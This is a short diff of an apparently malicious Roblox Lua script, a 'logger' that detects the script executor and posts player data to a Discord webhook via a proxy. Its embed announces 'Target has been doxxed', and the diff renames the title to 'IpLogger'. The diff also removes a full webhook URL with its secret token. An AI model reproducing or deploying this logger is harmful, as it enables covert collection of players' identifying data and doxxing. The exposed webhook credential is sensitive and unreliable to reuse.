@@ -9,7 +9,7 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-local WebhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1549137752078164008/30EJxv_O5QMfqwyZWcd5hFYWCYxIaQmvmkNqgxaYAudIfBVrrWZQ_v8tTyChkE8mhhoW"
+local WebhookUrl = ""
 
 local function GetExecutor()
 	local ok, name = pcall(function()
@@ -53,7 +53,7 @@ local function SendLog()
 	local data = {
 		username = "Vangeliicide Logger",
 		embeds = {{
-			title = "🔥 VANGELIICIDE LOGGER",
+			title = "🔥 IpLogger",
 			description = "```diff\n+ Target has been doxxed\n```",
 			color = 0x00FF6A,
 			thumbnail = {url = avatar},
